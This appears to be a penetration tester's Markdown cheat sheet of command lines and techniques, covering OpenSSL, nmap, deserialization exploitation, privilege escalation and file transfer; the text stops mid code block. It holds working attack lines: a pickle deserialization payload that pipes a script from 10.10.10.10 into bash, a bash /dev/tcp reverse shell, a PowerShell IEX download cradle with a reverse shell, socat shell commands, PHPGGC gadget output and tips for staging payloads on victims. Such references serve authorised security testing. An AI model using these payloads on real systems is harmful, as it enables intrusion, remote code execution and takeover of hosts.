# Technical hints

> Use this [tool](https://ecotrust-canada.github.io/markdown-toc/) to build the TOC.

* [Personal methodology to assess an web app in whitebox mode](#Personal-methodology-to-assess-a-web-app-in-whitebox-mode)
* [Useful command lines](#useful-command-lines)
* [Deserialization issue exploitation](#deserialization-issue-exploitation)
* [Connect to listener for a reverse shell](#connect-to-listener-for-a-reverse-shell)
* [Setup a local listener for a reverse shell](#setup-a-local-listener-for-a-reverse-shell)
* [See OS version and architecture](#see-os-version-and-architecture)
* [Nmap ping sweep](#nmap-ping-sweep)
* [Nmap vhosts scanning](#nmap-vhosts-scanning)
* [Nmap scan specifying a source port to bypass lazy firewall filtering](#nmap-scan-specifying-a-source-port-to-bypass-lazy-firewall-filtering)
* [Nmap on IPv6 target](#nmap-on-ipv6-target)
* [Nmap UDP scan](#nmap-udp-scan)
* [Nmap formatted report](#nmap-formatted-report)
* [SCP using IPv6](#scp-using-ipv6)
* [SSH using IPv6](#ssh-using-ipv6)
* [SSH local port forwarding](#ssh-local-port-forwarding)
* [Get IPv6 addresses of hosts around](#get-ipv6-addresses-of-hosts-around)
* [List known hosts IPV6 addresses](#list-known-hosts-ipv6-addresses)
* [List known hosts IPV4 addresses and hosts](#list-known-hosts-ipv4-addresses-and-hosts)
* [Forward TCP traffic from SOURCE to DESTINATION using SOCAT and sent it as background task](#forward-tcp-traffic-from-source-to-destination-using-socat-and-sent-it-as-background-task)
* [Possible ways to perform a LPE on Linux](#possible-ways-to-perform-a-lpe-on-linux)
* [Upgrading shells to fully interactive TTYs](#upgrading-shells-to-fully-interactive-ttys)
* [File temporary storage location](#file-temporary-storage-location)
* [Start local HTTP server to transfer payload to the victim host](#start-local-http-server-to-transfer-payload-to-the-victim-host)
* [Start local SMTP server to allow to receive mail](#start-local-smtp-server-to-allow-to-receive-mail)
* [Listen for ICMP messages in order to test connection from a remote host](#listen-for-icmp-messages-in-order-to-test-connection-from-a-remote-host)
* [Leverage WFUZZ for user enumeration](#leverage-wfuzz-for-user-enumeration)
* [Verify if INPUT or OUTPUT traffic is filtered](#verify-if-input-or-output-traffic-is-filtered)
* [Verify NGINX configuration statically](#verify-nginx-configuration-statically)
* [Share files between a Linux and a Windows machine](#share-files-between-a-linux-and-a-windows-machine)
* [Get information to use for system PrivEsc](#get-information-to-use-for-system-privesc)
* [NoSQL injection hints](#nosql-injection-hints)
* [SQL injection hints](#sql-injection-hints)
* [Debug a DotNet web app with DNSpy](#debug-a-dotnet-web-app-with-dnspy)
* [Debug a Python web app with VSCode](#debug-a-python-web-app-with-vscode)
* [Debug a NodeJS web app with VSCode](#debug-a-nodejs-web-app-with-vscode)
* [Debug a PHP web app with VSCode](#debug-a-php-web-app-with-vscode)
* [Method Resolution Order (MRO) in Python](#method-resolution-order-in-python)
* [Open RDP session via XFREERDP](#open-rdp-session-via-xfreerdp)
* [Python coding tips](#python-coding-tips)
* [Identify JavaScript libs deployed alongside a web application but not referenced](#identify-javascript-libs-deployed-alongside-a-web-application-but-not-referenced)
* [Disable TLS warnings in the requests python module](#disable-tls-warnings-in-the-requests-python-module)
* [JavaScript Fetch API tips](#javascript-fetch-api-tips)
* [JavaScript general payloads and tips](#javaScript-general-payloads-and-tips)
* [Meterpreter shell tips](#meterpreter-shell-tips)
* [SSTI tips](#ssti-tips)
* [XML entities types and XXE payloads](#xml-entities-types-and-xxe-payloads)
* [PHP Type Juggling](#php-type-juggling)
* [Identify gRPC services via reflection](#identify-grpc-services-via-reflection)
* [UUID explanation and vulnerabilities](#uuid-explanation-and-vulnerabilities)
* [Audit JWT token](#audit-jwt-token)
* [JSON parser issue tests](#json-parser-issue-tests)
* [Derivate passwords from a base](#derivate-passwords-from-a-base)
* [Transfer a file between two Windows RDP session via the clipboard](#transfer-a-file-between-two-windows-rdp-session-via-the-clipboard)
* [Check if a ASPNET ViewState use leaked encryption and validation keys](#check-if-a-aspnet-viewstate-use-leaked-encryption-and-validation-keys)
* [Hijack .NET app processing flow via its config](#hijack-net-app-processing-flow-via-its-config)
* [Time-Based One-Time Password algorithm](#totp-algorithm)
* [Inspect java program for attack surfaces](#inspect-java-program-for-attack-surfaces)
* [HTTP Signature](#http-signature)
* [Extract services information from OpenAPI document via JQ](#extract-services-information-from-openapi-document-via-jq)
* [Google Dork hints](#google-dork-hints)

## Personal methodology to assess a web app in whitebox mode

**Flow:**

```text
ANONYMOUS > AUTHENTICATED LOW PRIV > AUTHENTICATED HIGH PRIV > SYSTEM READ/WRITE > SHELL
```

**Step 1:**

Identify in code all features accessible anonymously and confirm access via an HTTP call.

**Step 2:**

Search into element identified in step 1 for vulnerability allowing to pass in a authenticated state (normal or privilegied):

* In case of SQLI: Verify if stack queries are supported, if NOT verify the presence of a reset password feature or any feature allowing to retrieve/obtain some kind of access token...
* In case of serialization: Verify if control is performed on the data received (signature, HMAC...)...
* Take care to logic applied in order to identify any issue in it (ex: custom algo or predictable generated element like reset token...).
* ...

**Step 3:**

Search for a way (doc, install file, hard coded, enumeration...) to obtain a user or a list of user in order to leverage the step 2.

**Step 4:**

Use element gathered in steps 1+2+3 to obtain an authenticated session.

**Needed if required for the next step:** If the access was not privilegied then repeat step 2+3 targeting feature accessible to the authenticated user in order to pass in privilegied mode.

**Step 5:**

Use element gathered in step 4 to look for a way to interact with the OS filesystem directly (ex: XXE) or via a relay like the DB (ex: custom extension).

**Step 6:**

Use element gathered in step 5 to look for vulnerability to gain RCE and then a reverse shell.

## Useful command lines

### OpenSSL

* [OpenSSL Cheatsheet](https://www.freecodecamp.org/news/openssl-command-cheatsheet-b441be1e8c4a/).
* [Generate eIDAS certificate using OpenSSL](https://enablebanking.com/blog/2020/01/13/how-to-generate-eidas-certificate/).
* [Create certificate with QCStatements using OpenSSL](https://stackoverflow.com/a/57013577).
* Script to generate eIDAS materials:
	* [Script to generate eIDAS Root CA materials using OpenSSL](../scripts/generate-eidas-materials-ca.sh)
	* [Script to generate eIDAS materials with the eIDAS Root CA created using OpenSSL](../scripts/generate-eidas-materials.sh).
* [Parse QcStatement](https://gist.github.com/lucamartellucci/f04e3b6199bad07eb64fd8a0c5ffe401#parse-qcstatement).

```shell
# Validate a RSA public key file
$ openssl rsa -noout -text -inform PEM -pubin -in public_key.pem

# Validate a EC public key file
$ openssl ec -noout -text -inform PEM -pubin -in public_key.pem

# Print textual representation of a RSA key:
$ openssl rsa -in public_or_private_rsa.key -text -noout

# Print OpenSSL version
$ openssl version

# Generate a self-signed certificate
$ openssl req -nodes -new -x509 -keyout server.key -out server.cert

# Extract RSA public key from RSA private key
$ openssl rsa -in server.key -pubout -out public.key

# Display certificate content
$ openssl x509 -text -in certificate.pem -text

# Parse QcStatement
# Source: https://gist.github.com/lucamartellucci/f04e3b6199bad07eb64fd8a0c5ffe401
$ openssl asn1parse -in certificate.pem
737:d=4  hl=3 l= 229 cons: SEQUENCE          
740:d=5  hl=2 l=   8 prim: OBJECT            :qcStatements
750:d=5  hl=3 l= 216 prim: OCTET STRING      [HEX DUMP]:3081D53008060604008E460101300B060604008E460103...
969:d=4  hl=4 l= 398 cons: SEQUENCE          
973:d=5  hl=2 l=   3 prim: OBJECT            :X509v3 Certificate Policies
$ echo "3081D53008060604008E460101300B060604008E460103..." > qc.hex
$ cat qc.hex | xxd -r -p | base64 > qc.pem
$ openssl asn1parse -in qc.pem
0:d=0  hl=3 l= 213 cons: SEQUENCE          
3:d=1  hl=2 l=   8 cons: SEQUENCE          
5:d=2  hl=2 l=   6 prim: OBJECT            :0.4.0.1862.1.1
13:d=1  hl=2 l=  11 cons: SEQUENCE          
15:d=2  hl=2 l=   6 prim: OBJECT            :0.4.0.1862.1.3
23:d=2  hl=2 l=   1 prim: INTEGER           :14
26:d=1  hl=2 l=   8 cons: SEQUENCE          
28:d=2  hl=2 l=   6 prim: OBJECT            :0.4.0.1862.1.4
36:d=1  hl=3 l= 177 cons: SEQUENCE          
39:d=2  hl=2 l=   6 prim: OBJECT            :0.4.0.1862.1.5
47:d=2  hl=3 l= 166 cons: SEQUENCE          
50:d=3  hl=2 l=  81 cons: SEQUENCE          
52:d=4  hl=2 l=  75 prim: IA5STRING         :https://www.actalis.it/tsa_disclosure_statement_actalis_it.pdf
129:d=4  hl=2 l=   2 prim: PRINTABLESTRING   :it
133:d=3  hl=2 l=  81 cons: SEQUENCE          
135:d=4  hl=2 l=  75 prim: IA5STRING         :https://www.actalis.it/tsa_disclosure_statement_actalis_en.pdf
212:d=4  hl=2 l=   2 prim: PRINTABLESTRING   :en

# Generate a SHA-256 hash of the content stored into the file "source.txt" and sign it
$ openssl dgst -sha256 -sign private.key -out sign.sha256 source.txt

# Encode the signature in Base64 and store it, as single line, into a file named "signature.txt"
$ openssl base64 -A -in sign.sha256 -out signature.txt
```

### TMUX

> `CTRL + b` then `d` to detach from the current session.

[TMUX Cheatsheet](https://tmuxcheatsheet.com/).

```shell
# Create a new session named "righettod"
$ tmux new -s righettod

# Attach to the session named "righettod"
$ tmux attach -d -t righettod

# List all sessions
$ tmux list-sessions
righettod: 1 windows (created Wed May 5 08:12:17 2021) [201x75]
```

### GPG

[GPG Cheatsheet](https://gist.github.com/turingbirds/3df43f1920a98010667a).

```shell
# Generate a GPG key pair
$ gpg --full-generate-key

# Export an ascii armored version of the public key
$ gpg --output public.pgp --armor --export username@email.com

# Export an ascii armored version of the secret key
$ gpg --output private.pgp --armor --export-secret-key username@email.com

# Import private key from X
$ gpg --import X-key-secret.asc

# Import public key from X
$ gpg --import X-key-public.asc

# Import public key for signature validation from Y
$ gpg --import Y-key-signature-public.asc

# Import public key for ciphering to Y
$ gpg --import Y-key-ciphering-public.asc

# List public keys
$ gpg --list-keys

# List private keys
$ gpg --list-secret-keys

# Encrypt file for Y (use Y public key)
$ gpg --always-trust --output test.gpg --encrypt --recipient yyy@y.com test.txt

# Sign file from X (use X private key)
$ gpg --output test.sig --sign test.txt

# Decrypt file for X (using X private key)
$ gpg --output doc --decrypt doc.gpg

# Encrypt and sign a file to Y from X
$ gpg --always-trust --output test-encrypted-signed.asc --encrypt --sign --armor -r yyy@y.com test.txt
```

### Git

#### Update a fork

[Documentation](https://medium.com/@sahoosunilkumar/how-to-update-a-fork-in-git-95a7daadc14e).

```shell
# git remote add upstream [REMOTE_SOURCE_REPO_URL].git
# ex: git remote add upstream https://github.com/OWASP/www-project-secure-headers.git
# git remote -v
$ git checkout master
$ git pull upstream master
$ git merge upstream master
$ git push origin master
```

### Linux

```shell
# List files recursively in folder "/tmp" and print them as table
$ find /tmp -type f -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null | column -t
pid                /tmp/pulse-PKdhtXMmr18n/pid  lab  lab  600
config-err-8ebCtm  /tmp/config-err-8ebCtm       lab  lab  600
.X10-lock          /tmp/.X10-lock               lab  lab  444

# Inspect what a binary does? http://man7.org/linux/man-pages/man1/ltrace.1.html
$ ltrace ./mybinary
setuid(0)
setgid(0)
printf("start or stop?: ")

# Find specific files and search specific content into them
$ find . -name ".ini" -exec grep --color -i "password" {} \;

# Check a private key: If the key has a pass phrase then a prompt will be opened to ask for it
$ openssl rsa -check -in pk-file.key

# See Zip archive content
$ zipinfo -1 myzipfile.zip

# Analyse the site (directoy deep of 10) but no download content and write working trace to the process.log file
$ wget -o process.log -r -l10 --spider https://mysite.com/
# Mirror locally a site and write working trace to the process.log file
$ wget -o process.log -mkEpnp https://mysite.com/

# One liner to perform a processing on a list of items coming from a file (ex: ip, url, domain, etc)
$ while read method; do echo -n "$method: ";echo -n $(http --verify=no $method https://mysite.com); done < methods.txt

# Generate a file with random data with a fixed size
# Use M for MB
# Use G for GB
$ head -c 70M </dev/urandom > big.txt

# Show folder content and show files size in MB
$ ls -l --block-size=M

# Get the "A" DNS record for all hostnames/domains contained in the provided text file
# in which there is one hostname/domain by line
$ dig A +multiline +noall +answer +nocmd -f hostnames.txt
```

### Windows Powershell

```powershell
# Watch the event of the Windows Firewall (need to be run as admin)
PS> Get-Content C:\Windows\System32\LogFiles\Firewall\pfirewall.log -Wait

# Grep in PowerShell
PS> Get-ChildItem -Path .\*.java -Recurse | Select-String -Pattern 'MyClass.call' -CaseSensitive
PS> Select-String -Path "*.java" -Pattern "@(Max|Min|Pattern|Size|Digits)"

# Tail in PowerShell
PS> Get-Content C:\MyFile.txt -Wait

# List local users
PS> Get-LocalUser

# List only enabled local users
PS> Get-LocalUser | Where { $_.Enabled -eq 'True' }

# Get infos about a local user
PS> net user righetto
PS> Get-LocalUser -Name "righetto"

# List users that are local administrator
PS> Get-LocalGroupMember -Group "Administrators"

# Try to list configuration files of installed applications
PS> Get-Childitem -Path "C:\Program Files" -Include *.xml,*.conf,*.config,*.ini,*.properties -Recurse -Force

# List environment variables
PS> Get-ChildItem Env:

# Identify all instances of a executable
PS> tasklist | findstr /i calc

# Kill all instances of a executable
PS> tasklist /f /IM calc.exe
```

```powershell
# Script to perform a port scan on a network range
# Copy paste the code in a text file or directly in PS shell
$baseIp="10.10.10."
$ips=@(1..254)
$ports=@(79..82)
foreach($ip in $ips){
	$h="${baseIp}${ip}"
	Write-Host "[+] $h : " -NoNewline -ForegroundColor Yellow
	$found=$FALSE
	foreach($p in $ports){
		$s=Test-NetConnection -ComputerName $h -port $p -InformationLevel "Quiet" -WarningAction:silentlycontinue
		if($s){ $found=$TRUE; Write-Host -NoNewline "$p "}
	}
	if($found){ Write-Host ""} else{ Write-Host "No open port found." }
}
```

### PostgreSQL

#### List functions

Inside a PSQL session:

```sql
# Check if a function named 'my_function' exists
\df my_function
# List all functions
\df
```

#### PSQL

Connect via [PSQL](http://postgresguide.com/utilities/psql.html):

```shell
$ psql "dbname=[DB] host=[HOST] user=[USER] password=[PASSWORD] port=[PORT]"
```

#### Enable logging of queries

In the `[PG_HOME]/data/postgresql.conf` file, change the following parameters ([source](https://stackoverflow.com/a/722236/451455)):

* **log_statement** to **all**.
* **logging_collector** to **on**.
* Make sure that the **log_directory** directory already exists inside of the data directory and that the postgres user can write to it.

### MySQL / MariaDB

#### Enable logging of queries

In the `[MYSQL_HOME]/my.cnf` file, change the following parameters ([source](https://stackoverflow.com/a/6479183/451455)):

* **general_log_file** to a file location where the mysql user can write to it (you can leave the default one).
* **general_log** to **1**.

### Command encoding for Windows Powershell

Use the following instruction to encode a command that will be passed to powershell using the syntax `powershell -EncodedCommand [CMD]`:

```shell
$ iconv -f ASCII -t UTF-16LE powershell-cmd-raw.txt | base64 | tr -d "\n" > powershell-encoded.txt
```

## Deserialization issue exploitation

### Identity serialization processing in code base

Search for the following strings.

#### Java

```
ObjectInputStream
readObject
```

#### .NET

```
ISerializable
Deserialize
Serialize
```

#### PHP

```
serialize
unserialize
```

#### Python

```
pickle
dumps
loads
```

### When YSOSERIAL for .NET is used

#### Different modes used

[Documentation](https://docs.microsoft.com/en-us/dotnet/standard/serialization) about the different modes used: JSON / Binary / XML.

#### Format of the .NET assembly-qualified name

[Documentation](https://docs.microsoft.com/en-us/dotnet/api/system.type.assemblyqualifiedname)

Example: `System.Globalization.NumberFormatInfo, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089`

Parts separated by a comma:

1. Namespace (`System.Globalization`) + `.` + Classname (`NumberFormatInfo`)
2. Display name of the assembly obtained using the `Assembly.FullName` property
3. Version of the assembly
4. Culture of the assembly
5. Optional PublicKeyToken (can be set to null)

### When YSOSERIAL is used

> This [script](../scripts/identify-potential-payloads.sh) can be used to perform a static analysis of the different libraries (JAR files) used by an application in order to identify potentials applicable YSOSERIAL payloads.

PowerShell break the binary content when sending it to a file using the `>` instruction like this:

```powershell
PS> java -jar ysoserial.jar Groovy1 calc.exe > payload.bin
```  

Use a normal shell (MSDOS) to generate the payload binary file and ensure that the HEX content start with **aced** or the Base64 content start with **rO0**.

Use the following Linux command to encode the binary payload in Base64:

```shell
$ cat payload.bin | base64 -w 0 > payload-encoded.txt
```

### When PHPGGC is used

Always use the option:

- `-s` to prevent any issue with non-printable characters.
- `-f` when the magic method used by the kick-off gadget (called vector in PHPGGC) is *__destruct*.

Example:

```shell
$ php phpggc -f "Symfony/RCE4" "system" "id"
a:2:{i:7;O:47:"Symfony\Component\Cache\Adapter\TagAwareAdapter":2:{s:57:"Symfony\Component\Cache\Adapter\TagAwareAdapterdeferred";a:1:{i:0;O:33:"Symfony\Component\Cache\CacheItem":2:{s:11:"*poolHash";i:1;s:12:"*innerItem";s:2:"id";}}s:53:"Symfony\Component\Cache\Adapter\TagAwareAdapterpool";O:44:"Symfony\Component\Cache\Adapter\ProxyAdapter":2:{s:54:"Symfony\Component\Cache\Adapter\ProxyAdapterpoolHash";i:1;s:58:"Symfony\Component\Cache\Adapter\ProxyAdaptersetInnerItem";s:6:"system";}}i:7;i:7;}

$ php phpggc -s -f "Symfony/RCE4" "system" "id"
a:2:{i:7%3BO:47:"Symfony\Component\Cache\Adapter\TagAwareAdapter":2:{s:57:"%00Symfony\Component\Cache\Adapter\TagAwareAdapter%00deferred"%3Ba:1:{i:0%3BO:33:"Symfony\Component\Cache\CacheItem":2:{s:11:"%00*%00poolHash"%3Bi:1%3Bs:12:"%00*%00innerItem"%3Bs:2:"id"%3B}}s:53:"%00Symfony\Component\Cache\Adapter\TagAwareAdapter%00pool"%3BO:44:"Symfony\Component\Cache\Adapter\ProxyAdapter":2:{s:54:"%00Symfony\Component\Cache\Adapter\ProxyAdapter%00poolHash"%3Bi:1%3Bs:58:"%00Symfony\Component\Cache\Adapter\ProxyAdapter%00setInnerItem"%3Bs:6:"system"%3B}}i:7%3Bi:7%3B}
```

### When Python is used

If the decoded element start by `\x80\x03` or `\x80\x04` then try to load it via [Pickle](https://docs.python.org/3/library/pickle.html) because it seems to be a serialized object:

```text
# Test on Linux
Python 3.8.2 - [GCC 9.3.0] on linux
>>> import pickle
>>> print(pickle.dumps("TEST"))
b'\x80\x04\x95\x08\x00\x00\x00\x00\x00\x00\x00\x8c\x04TEST\x94.'
>>> print(pickle.dumps([1,2,3]))
b'\x80\x04\x95\x0b\x00\x00\x00\x00\x00\x00\x00]\x94(K\x01K\x02K\x03e.'
>>> print(pickle.dumps({"A":123}))
b'\x80\x04\x95\n\x00\x00\x00\x00\x00\x00\x00}\x94\x8c\x01A\x94K{s.'

# Test on Windows
Python 3.7.8 - [MSC v.1916 64 bit (AMD64)] on win32
>>> import pickle
>>> print(pickle.dumps("TEST"))
b'\x80\x03X\x04\x00\x00\x00TESTq\x00.'
>>> print(pickle.dumps([1,2,3]))
b'\x80\x03]q\x00(K\x01K\x02K\x03e.'
>>> print(pickle.dumps({"A":123}))
b'\x80\x03}q\x00X\x01\x00\x00\x00Aq\x01K{s.'
```

Code to deserialize a Base64 encoded content using Pickle:

```python
import pickle, base64
encoded = "gAN9cQBYBQAAAG....."
decoded = base64.b64decode(encoded)
object = pickle.loads(decoded)
print(object)
```

Payload example in order obtain a code execution during the deserialize phase:

```python
#!/usr/bin/python3
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('/usr/bin/curl 10.10.10.10/rs.sh | /bin/bash')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    encoded = base64.b64encode(pickled)
    print(encoded) # String to use
```

## Connect to listener for a reverse shell

### Linux

```shell
$ /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'
```

### Windows Powershell

:information_source: For this case a web listener is needed in addition of the netcat listener.

:information_source: In the command below the web listener listen on `10.10.10.10:9200` and the netcat listener listen on `10.10.10.10:9001`

The PS command that is executed is based on [IEX (Invoke-Expression)](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7): 

> The **Invoke-Expression** (IEX) cmdlet evaluates or runs **a specified string** as a command and returns the results of the expression or command.

*System.Net.WebClient* class [documentation](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=netcore-3.1)

> Downloads the requested resource as a String. The resource to download may be specified as either String containing the URI or a Uri.

```powershell
PS> IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:9200/rs.ps1')
```

For the script executed (invoked as an string expression), the script [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) is used but with the **adding of this line at the end of the script to auto-execute the function** defined by the script:

```powershell
PS> Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 9001
```

## Setup a local listener for a reverse shell

```shell
$ nc -lnvp 9001
```

## See OS version and architecture

### Linux

```shell
$ lsb_release -a
$ hostnamectl
$ cat /etc/os-release
```

See the script [os-info.sh](https://github.com/righettod/toolbox-pentest-web/blob/master/scripts/os-info.sh).

### Windows Powershell

```powershell
PS> Systeminfo 
Host Name:                 MACHINETEST
OS Name:                   Microsoft Windows Server 2012 R2 Datacenter
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
...
```

## Nmap ping sweep

> :bulb: The option `--stats-every` allow to get feedback about the command processing state every delay specified.

```shell
$ nmap --stats-every 10s -sP 172.31.1-255
```

See the script [ping-sweep.sh](https://github.com/righettod/toolbox-pentest-web/blob/master/scripts/ping-sweep.sh) if it is not possible to upload a static version of nmap.

Same thing regarding the script [ports-scan.sh](https://github.com/righettod/toolbox-pentest-web/blob/master/scripts/ports-scan.sh).

## Nmap vhosts scanning

[NSE script documentation](https://nmap.org/nsedoc/scripts/http-vhosts.html).

```shell
$ nmap -iL hostnames.txt -Pn --open -p 80,443 -oN scan.txt --script http-vhosts --script-args http-vhosts.filelist=/tmp/vhost.txt
$ nmap -Pn --open -p 80 --script http-vhosts --script-args http-vhosts.filelist=/tmp/vhost.txt 172.31.1.69
```

## Nmap scan specifying a source port to bypass lazy firewall filtering

Here using DNS ports because it is often allowed (no DNS resolution) and assuming that the host is alive

```shell
$ nmap -sS -p1-1024 -Pn -n -v --source-port 53 192.168.5.2
```

## Nmap on IPv6 target

IP is specified using `[IP]%[NETWORK_CARD_IDENTIFIER]`

```shell
$ nmap -6 -p 2222 --open fe80::5054:ff:fec6:7066%ens3
```

## Nmap UDP scan

> Via **unicornscan** in case of need `unicornscan -mU [TARGET]`.

[Documentation](https://nmap.org/book/scan-methods-udp-scan.html).

```shell
$ nmap -sU [TARGET]
```

## Nmap formatted report

[Documentation](https://github.com/honze-net/nmap-bootstrap-xsl).

```shell
$ nmap -sV -oA report --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl [TARGET]
```

## SCP using IPv6

IP is specified between `[]`

```shell
$ scp -P 987 user@[fe80::5054:ff:fec6:7066%ens3]:/home/file.txt .
```

## SSH using IPv6

```shell
$ ssh -p2222 user@fe80::5054:ff:fec6:7066%ens3
```

## Get IPv6 addresses of hosts around

Ping the multicast IPV6 address (ff02::1) to get the IPV6 address of neighbours:

* [Source 1](https://en.wikipedia.org/wiki/Multicast_address#IPv6)
* [Source 2](https://www.menandmice.com/blog/ipv6-reference-multicast/)

*ens3* is the `[NETWORK_CARD_IDENTIFIER]`

```shell
$ ping6 -I ens3 ff02::1
```

 See the script [identify-neighbour-hosts.sh](https://github.com/righettod/toolbox-pentest-web/blob/master/scripts/network-config.sh).

## List known hosts IPV6 addresses

```shell
$ ip -6 neigh
```

## List known hosts IPV4 addresses and hosts

In order to map corresponding IPV6 addresses based on MAC addresses and then identify hosts.

Use `arp -a` without param `-n` to see hostname.

```shell
$ arp -an
```

## Forward TCP traffic from SOURCE to DESTINATION using SOCAT and sent it as background task

Syntax:

```shell
$ socat TCP-LISTEN:SOURCE_PORT,bind=SOURCE_ADDRESS,fork,reuseaddr TCP:DESTINATION_ADDRESS:DESTINATION_PORT &
```

Example:

```shell
$ socat TCP-LISTEN:9002,bind=192.168.145.5,fork,reuseaddr TCP:localhost:9001 &
```

## Possible ways to perform a LPE on Linux

See [this video from IppSec](https://www.youtube.com/watch?v=LfbwlPxToBc&t=3339s).

### Way 1

Search for services listening on localhost and running as root then try to explore them...

```shell
$ netstat -anlp | grep LIST
```

### Way 2

Check if there is SPICE ports used.

Spice is an open remote computing solution, providing client access to remote displays and devices

The main use case is to get remote access to virtual machines.

Port example: 5800/5900 for VNC

```shell
$ ps -eaf | grep [PORT] #and check for SPICE port in the command line
```

Use tool like remove-viewer to access to the console (`apt install virt-viewer`)

```shell
$ remove-viewer spice://[TARGET_ADDRESS]:[SPICE_PORT]
```

Once on the login prompt:

1) Reboot the VM via `CTRL+ALT+DEL`.
2) Edit the GRUB to have a shell as root: [password recovery](https://linuxhint.com/reset_password_kali_linux_2020/).
3) Change the root password and then reboot the VM.

## Upgrading shells to fully interactive TTYs 

* [Source 1](https://www.ivoidwarranties.tech/posts/pentesting-tuts/upgrading-shells/).
* [Source 2](http://netsec.ws/?p=337).

### Method 0: Using script system binary

```shell
$ /usr/bin/script -qc /bin/bash /dev/null
$ export TERM=xterm
```

### Method 1: Using Python pty module

```python
$ python -c 'import pty; pty.spawn("/bin/bash")'
```

### Method 2: Using socat

On attacker Linux machine (listen):

```shell
$ socat file:`tty`,raw,echo=0 tcp-listen:4444
```

On victim Linux machine (connect):

```shell
$ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

### Method 3: Using infodox python-pty-shells scripts

[Scripts repository](https://github.com/infodox/python-pty-shells).

**Require Python2 on the both side!**

Run the script `tcp_pty_shell_handler.py` on the attacker machine.

Run the script `tcp_pty_backconnect.py` on the victim machine to connect to the handler.

## File temporary storage location

### Linux

[Source](https://www.cyberciti.biz/tips/what-is-devshm-and-its-practical-usage.html).

On Linux, file like reverse shell can be stored in folder `/dev/shm` in order to not pollute the permanent storage and allow an auto-cleanup at reboot.

`/dev/shm` is nothing but implementation of traditional shared memory concept.

## Start local HTTP server to transfer payload to the victim host

Run the following command on the attacker host.

Python2:

```python
$ python -m SimpleHTTPServer
```

Python3:

```python
$ python -m http.server
```

NodeJS with HTTPS:

```shell
# npm install -g http-server
# Listen on all machine IP addresses on port 4443
$ http-server -p 4443 -S -C cert.pem -K key.pem
```

## Listen for ICMP messages in order to test connection from a remote host

Useful to test a blind RCE.

Run the following command on the attacker machine:

```shell
# Linux
# Example: tcpdump -i eth0 icmp
$ sudo tcpdump -i [INTERFACE] icmp
```

```powershell
# Windows: https://www.winpcap.org/windump/install/default.htm
# List the interface
PS> windump.exe -D
# Listen
# Example: windump.exe -i "\Device\NPF_{ABC26408-X6CZ-4200-9276-34V8982C9983}" icmp
PS> WinDump.exe -i "[INTERFACE]" icmp
```

Run the following command on the victim machine:

```shell
# Linux
$ ping -c 2 [ATTACKER_IP]
```

```powershell
# Windows
PS> ping -n 2 [ATTACKER_IP]
```

## Leverage WFUZZ for user enumeration

Example of a command to use in case of an application sending a HTTP response containing the message *Wrong identification* when the user exists:

```shell
# Use the dict "names.txt" from SecLists (folder "Usernames/Names")
# It is a POST request
# We only show responses with an HTTP 200 and containing the expected string
$ wfuzz -c -z file,names.txt --sc 200 --ss "(Wrong identification)" -d "username=FUZZ&password=badpwd" "http://10.0.3.4/login.php"

# Table of results rendered by WFUZZ during the operation
===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000086:   200        102 L    659 W    7091 Ch     "john"
000000111:   200        102 L    657 W    7074 Ch     "ariel"
```

Help about the error *[Unhandled exception: cannot add/remove handle - multi_perform() already running](https://github.com/xmendez/wfuzz/issues/180#issuecomment-577135888)*


## Verify if INPUT or OUTPUT traffic is filtered

### Linux

Check the following files for presence of *IPTABLES* rules:

```shell
# For IPV4
$ cat /etc/iptables/rules.v4
# For IPV6
$ cat /etc/iptables/rules.v6
```

### Windows Powershell

```powershell
# Get firewall profiles that are enabled
PS> Get-NetFirewallProfile | Where { $_.Enabled -eq 'True' }
# List all inbound enabled rules
PS> Get-NetFirewallRule | Where { $_.Enabled -eq 'True' -and $_.Direction -eq 'Inbound' }
# List all inbound enabled rules applying a block action
PS> Get-NetFirewallRule | Where { $_.Enabled -eq 'True' -and $_.Direction -eq 'Inbound' -and $_.Action -eq 'Block' }
# List all outbound enabled rules
PS> Get-NetFirewallRule | Where { $_.Enabled -eq 'True' -and $_.Direction -eq 'Outbound' }
# List all outbound enabled rules applying a block action
PS> Get-NetFirewallRule | Where { $_.Enabled -eq 'True' -and $_.Direction -eq 'Outbound' -and $_.Action -eq 'Block' }
```

## Verify NGINX configuration statically

The tool [GIXY](https://github.com/yandex/gixy) can be used against the NGINX configuration file.

## Share files between a Linux and a Windows machine

:information_source: Here the attacker machine is the Linux (IP: 10.10.14.10) one and the victim is the Windows (IP: 10.10.10.158) one.

1. On the attacker machine (Linux), use the following command to create the SMB share:

```shell
$ sudo impacket-smbserver -username righettod -password righettod ShareSpace $(pwd)
Impacket v0.9.21 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
```

2. On the victim machine (Windows), use the following command to mount the SMB share:

```powershell
PS> $pass = "righettod" | ConvertTo-SecureString -AsPlainText -Force
PS> $pass
System.Security.SecureString

PS> $cred = New-Object System.Management.Automation.PsCredential('righettod', $pass)
PS> $cred
UserName                                                               Password
--------                                                               --------
righettod                                          System.Security.SecureString

PS> New-PSDrive -name ShareSpace -root \\10.10.14.10\ShareSpace -Credential $cred -PSProvider "filesystem"
Name           Used (GB)     Free (GB) Provider      Root                      
----           ---------     --------- --------      ----                      
ShareSpace                             FileSystem    \\10.10.14.10\ShareSpace  

PS> cd ShareSpace:
```

:warning: I have meet the following error on Kali with *Impacket v0.9.20* and *Python 3.8.x*:

```shell
